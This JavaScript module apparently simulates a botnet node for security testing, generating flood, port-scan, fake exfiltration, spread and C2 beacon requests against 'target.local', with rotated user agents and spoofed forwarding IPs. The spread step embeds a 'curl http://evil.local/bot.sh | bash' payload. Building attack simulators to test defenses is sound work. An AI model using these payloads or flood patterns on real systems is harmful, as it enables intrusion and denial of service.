/**
 * Botnet Node - Synthetic Agent
 * 
 * Simulates a node in a distributed botnet attack.
 * Coordinates with other nodes for DDoS, scanning, and exfiltration.
 * 
 * DARK LAYER ONLY - No telemetry, no logging.
 */

const PHI = 1.618033988749895;
const HB = 873;

/**
 * Botnet command types
 */
const BOT_COMMANDS = {
  IDLE: 'idle',
  SCAN: 'scan',
  FLOOD: 'flood',
  EXFIL: 'exfil',
  SPREAD: 'spread',
  SLEEP: 'sleep'
};

/**
 * Botnet Node - Distributed Attack Simulator
 */
export class BotnetNode {
  constructor(config = {}) {
    this.id = `bot-${crypto.randomUUID().slice(0, 8)}`;
    this.config = {
      maxRequests: config.maxRequests || 5000,
      burstSize: config.burstSize || 50,
      burstDelay: config.burstDelay || 100,
      cooldown: config.cooldown || 5000,
      coordinatorUrl: config.coordinatorUrl || null,
      ...config
    };
    
    this.state = {
      requestCount: 0,
      lastRequest: null,
      currentCommand: BOT_COMMANDS.IDLE,
      burstCount: 0,
      targets: [],
      exfilData: [],
      infections: 0,
      phase: 'initialization'
    };
  }
  
  /**
   * Generate next request based on current command
   */
  async nextRequest() {
    switch (this.state.currentCommand) {
      case BOT_COMMANDS.FLOOD:
        return this.generateFloodRequest();
      case BOT_COMMANDS.SCAN:
        return this.generateScanRequest();
      case BOT_COMMANDS.EXFIL:
        return this.generateExfilRequest();
      case BOT_COMMANDS.SPREAD:
        return this.generateSpreadRequest();
      default:
        return this.generateHeartbeatRequest();
    }
  }
  
  /**
   * Generate DDoS flood request
   */
  generateFloodRequest() {
    this.state.requestCount++;
    this.state.burstCount++;
    
    // Random target from pool
    const target = this.state.targets[Math.floor(Math.random() * this.state.targets.length)] || '/';
    
    return {
      url: `https://target.local${target}`,
      method: ['GET', 'POST', 'HEAD'][Math.floor(Math.random() * 3)],
      headers: {
        'User-Agent': this.getRandomUA(),
        'Accept': '*/*',
        'X-Forwarded-For': this.getRandomIP(),
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive'
      },
      body: this.generateJunkPayload(),
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        phase: 'flood',
        burstNumber: this.state.burstCount,
        target
      }
    };
  }
  
  /**
   * Generate scanning request
   */
  generateScanRequest() {
    this.state.requestCount++;
    
    const port = 80 + Math.floor(Math.random() * 10000);
    const ip = this.getRandomIP();
    
    return {
      url: `https://target.local/scan-sim`,
      method: 'POST',
      headers: {
        'User-Agent': 'BotnetScanner/1.0',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        type: 'port-scan',
        targetIP: ip,
        targetPort: port
      }),
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        phase: 'scan',
        targetIP: ip,
        targetPort: port
      }
    };
  }
  
  /**
   * Generate exfiltration request
   */
  generateExfilRequest() {
    this.state.requestCount++;
    
    // Simulate data exfiltration
    const fakeData = {
      type: 'exfil',
      data: this.generateFakeExfilData()
    };
    
    return {
      url: `https://target.local/api/upload`,
      method: 'POST',
      headers: {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/octet-stream',
        'X-Forwarded-For': this.getRandomIP()
      },
      body: JSON.stringify(fakeData),
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        phase: 'exfil',
        dataSize: JSON.stringify(fakeData).length
      }
    };
  }
  
  /**
   * Generate spreading/infection request
   */
  generateSpreadRequest() {
    this.state.requestCount++;
    
    return {
      url: `https://target.local/api/eval`,
      method: 'POST',
      headers: {
        'User-Agent': 'Wget/1.21',
        'Content-Type': 'text/plain'
      },
      body: `#!/bin/bash\ncurl http://evil.local/bot.sh | bash`,
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        phase: 'spread',
        payload: 'shell-script'
      }
    };
  }
  
  /**
   * Generate C2 heartbeat
   */
  generateHeartbeatRequest() {
    this.state.requestCount++;
    
    return {
      url: `https://target.local/api/beacon`,
      method: 'POST',
      headers: {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        botId: this.id,
        status: 'alive',
        lastCommand: this.state.currentCommand,
        requestCount: this.state.requestCount
      }),
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        phase: 'heartbeat'
      }
    };
  }
  
  /**
   * Process response and update state
   */
  async processResponse(response) {
    const status = response.status;
    
    // Check for C2 commands in response
    if (status === 200) {
      try {
        const body = await response.json?.();
        if (body?.command) {
          this.state.currentCommand = body.command;
        }
        if (body?.targets) {
          this.state.targets = body.targets;
        }
      } catch (e) {
        // Not JSON, ignore
      }
    }
    
    // Reset burst count after cooldown
    if (this.state.burstCount >= this.config.burstSize) {
      this.state.burstCount = 0;
      this.state.currentCommand = BOT_COMMANDS.IDLE;
    }
  }
  
  /**
   * Set command (for scenario control)
   */
  setCommand(command, targets = []) {
    this.state.currentCommand = command;
    if (targets.length > 0) {
      this.state.targets = targets;
    }
  }
  
  /**
   * Generate random user agent
   */
  getRandomUA() {
    const uas = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
      'Mozilla/5.0 (Linux; Android 11)',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)',
      'curl/7.68.0'
    ];
    return uas[Math.floor(Math.random() * uas.length)];
  }
  
  /**
   * Generate random IP
   */
  getRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }
  
  /**
   * Generate junk payload for floods
   */
  generateJunkPayload() {
    const size = 100 + Math.floor(Math.random() * 900);
    return 'X'.repeat(size);
  }
  
  /**
   * Generate fake exfiltration data
   */
  generateFakeExfilData() {
    return {
      hostname: `victim-${Math.floor(Math.random() * 1000)}`,
      ip: this.getRandomIP(),
      files: ['passwords.txt', 'config.json', 'database.sql'],
      timestamp: Date.now()
    };
  }
  
  /**
   * Check if should continue
   */
  shouldContinue() {
    return this.state.requestCount < this.config.maxRequests;
  }
  
  /**
   * Get state summary
   */
  getState() {
    return {
      id: this.id,
      type: 'botnet-node',
      requestCount: this.state.requestCount,
      currentCommand: this.state.currentCommand,
      burstCount: this.state.burstCount,
      targetsCount: this.state.targets.length,
      phase: this.state.phase,
      progress: this.state.requestCount / this.config.maxRequests
    };
  }
}

export { BOT_COMMANDS };
export default BotnetNode;
